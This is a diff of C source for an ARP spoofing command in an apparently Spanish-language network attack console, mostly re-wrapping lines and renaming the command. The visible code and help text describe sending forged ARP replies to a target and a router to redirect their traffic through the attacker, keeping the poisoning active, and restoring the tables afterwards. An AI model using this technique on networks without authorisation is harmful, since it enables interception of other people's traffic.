@@ -14,7 +14,7 @@
 #include "properties.h"
 #include "properties_types.h"
 
-#define NAME "arp-spoof"
+#define NAME "arp_spoof"
 
 static pcap_t *pcap_handle;
 
@@ -34,8 +34,10 @@ int keyboard_interrupt = 0;
 static int spoof_help() {
   printf("help -> " AMARILLO "muestra esta ayuda" RESET "\n"
          "send -> " AMARILLO "envia un paquete de susplantación ARP" RESET "\n"
-         "handle -> " AMARILLO "captura paquetes ARP para mantener la susplantación en pie" RESET "\n"
-         "restore -> " AMARILLO "restablece las tablas ARP de los dispocitivos afectados" RESET "\n");
+         "handle -> " AMARILLO
+         "captura paquetes ARP para mantener la susplantación en pie" RESET "\n"
+         "restore -> " AMARILLO
+         "restablece las tablas ARP de los dispocitivos afectados" RESET "\n");
   return EXIT_SUCCESS;
 }
 
@@ -53,18 +55,21 @@ static int spoof_send() {
   return EXIT_SUCCESS;
 }
 
-static void packet_handle(u_char *user_d, const struct pcap_pkthdr *header, const u_char *packet) {
+static void packet_handle(u_char *user_d, const struct pcap_pkthdr *header,
+                          const u_char *packet) {
   struct arp_header arp = *(const struct arp_header *)(packet + sizeof(struct ethhdr));
-  if ((arp.spa == router_ip || arp.spa == target_ip) && (arp.tpa == router_ip || arp.tpa == target_ip) &&
-      (arp.spa != arp.tpa)) {
+  if ((arp.spa == router_ip || arp.spa == target_ip) &&
+      (arp.tpa == router_ip || arp.tpa == target_ip) && (arp.spa != arp.tpa)) {
     if (arp.op == 1) {
       if (!send_arp_reply(local_mac, arp.tpa, arp.sha, arp.spa, iface->value)) {
-        log_add(NULL, ERROR, "ARPSpoof-Packet-Handle", "Error al enviar el paquete ARP Reply");
+        log_add(NULL, ERROR, "ARPSpoof-Packet-Handle",
+                "Error al enviar el paquete ARP Reply");
         log_show_and_clear(NULL);
       }
     } else {
       if (!send_arp_reply(local_mac, arp.spa, arp.tha, arp.tpa, iface->value)) {
-        log_add(NULL, ERROR, "ARPSpoof-Packet-Handle", "Error al enviar el paquete ARP Reply");
+        log_add(NULL, ERROR, "ARPSpoof-Packet-Handle",
+                "Error al enviar el paquete ARP Reply");
         log_show_and_clear(NULL);
       }
     }
@@ -119,12 +124,14 @@ static int spoof_handle() {
 
 static int spoof_restore() {
   if (!send_arp_reply(router_mac, router_ip, target_mac, target_ip, iface->value)) {
-    log_add(NULL, ERROR, "ARPSpoof-Restore", "No se pudo enviar el paquete ARP al objetivo");
+    log_add(NULL, ERROR, "ARPSpoof-Restore",
+            "No se pudo enviar el paquete ARP al objetivo");
     log_show_and_clear(NULL);
     return EXIT_FAILURE;
   }
   if (!send_arp_reply(target_mac, target_ip, router_mac, router_ip, iface->value)) {
-    log_add(NULL, ERROR, "ARPSpoof-Restore", "No se pudo enviar el paquete ARP al router");
+    log_add(NULL, ERROR, "ARPSpoof-Restore",
+            "No se pudo enviar el paquete ARP al router");
     log_show_and_clear(NULL);
     return EXIT_FAILURE;
   }
@@ -155,12 +162,14 @@ static int fn_arp_spoof(LIST_ptr args) {
     return EXIT_FAILURE;
   };
   if (!get_local_ip(&local_ip, iface->value)) {
-    log_add(NULL, ERROR, "ARPSpoof", "No se pudo obtener la dirección IP de esta maquina");
+    log_add(NULL, ERROR, "ARPSpoof",
+            "No se pudo obtener la dirección IP de esta maquina");
     log_show_and_clear(NULL);
     return EXIT_FAILURE;
   }
   if (!get_local_mac(local_mac, iface->value)) {
-    log_add(NULL, ERROR, "ARPSpoof", "No se pudo obtener la dirección MAC de esta maquina");
+    log_add(NULL, ERROR, "ARPSpoof",
+            "No se pudo obtener la dirección MAC de esta maquina");
     log_show_and_clear(NULL);
     return EXIT_FAILURE;
   }
@@ -209,15 +218,20 @@ const Command cmd_arp_spoof = {
     "Permite hacer ataques de ARP Spoofing",
     "Ataques de Suplantación ARP",
     "Comando: spoof\n"
-    "Descripción: Realiza ataques de suplantación ARP (ARP Spoofing) contra un objetivo y un router definidos "
+    "Descripción: Realiza ataques de suplantación ARP (ARP Spoofing) contra un objetivo "
+    "y un router definidos "
     "previamente.\n"
     "\n"
     "Uso:\n"
-    "  spoof help -> Muestra esta ayuda.\n"
-    "  spoof send -> Envía un solo paquete ARP de suplantación al objetivo y al router.\n"
-    "  spoof handle -> Inicia una escucha de paquetes ARP y mantiene la suplantación activa respondiendo "
+    "  arp_spoof help -> Muestra esta ayuda.\n"
+    "  arp_spoof send -> Envía un solo paquete ARP de suplantación al objetivo y al "
+    "router.\n"
+    "  arp_spoof handle -> Inicia una escucha de paquetes ARP y mantiene la suplantación "
+    "activa respondiendo "
     "automáticamente.\n"
-    "  spoof restore -> Restablece las tablas ARP del router y del objetivo a su estado original.\n"
+    "  arp_spoof restore -> Restablece las tablas ARP del router y del objetivo a su "
+    "estado "
+    "original.\n"
     "\n"
     "Descripción detallada de argumentos:\n"
     "  help ->\n"
@@ -227,12 +241,14 @@ const Command cmd_arp_spoof = {
     "    Envía paquetes ARP Reply falsificados:\n"
     "      - Al objetivo: indicando que la MAC local es la del router.\n"
     "      - Al router: indicando que la MAC local es la del objetivo.\n"
-    "    Esto engaña a ambos dispositivos para redirigir el tráfico a la máquina atacante.\n"
+    "    Esto engaña a ambos dispositivos para redirigir el tráfico a la máquina "
+    "atacante.\n"
     "\n"
     "  handle ->\n"
     "    Inicia un sniffer ARP con PCAP:\n"
     "      - Usa un filtro para capturar solo paquetes ARP.\n"
-    "      - Responde automáticamente con paquetes falsificados si detecta paquetes legítimos entre el objetivo y el "
+    "      - Responde automáticamente con paquetes falsificados si detecta paquetes "
+    "legítimos entre el objetivo y el "
     "router.\n"
     "      - Se puede detener con CTRL+C (SIGINT), restableciendo el estado.\n"
     "\n"
@@ -240,7 +256,8 @@ const Command cmd_arp_spoof = {
     "    Envía paquetes ARP legítimos para restaurar las tablas ARP:\n"
     "      - Al objetivo: se le informa la MAC real del router.\n"
     "      - Al router: se le informa la MAC real del objetivo.\n"
-    "    Esto detiene la suplantación y restablece la comunicación normal entre los dispositivos.\n"
+    "    Esto detiene la suplantación y restablece la comunicación normal entre los "
+    "dispositivos.\n"
     "\n"
     "Notas:\n"
     "  - Requiere las siguientes propiedades registradas:\n"
@@ -249,7 +266,8 @@ const Command cmd_arp_spoof = {
     "      ROUTER_HWADDR -> Dirección MAC del router\n"
     "      TARGET_ADDR -> Dirección IP del objetivo\n"
     "      TARGET_HWADDR -> Dirección MAC del objetivo\n"
-    "  - La interfaz debe tener permisos para enviar paquetes sin restricciones (modo promiscuo).\n",
+    "  - La interfaz debe tener permisos para enviar paquetes sin restricciones (modo "
+    "promiscuo).\n",
     {1, 1},
     fn_arp_spoof,
 };
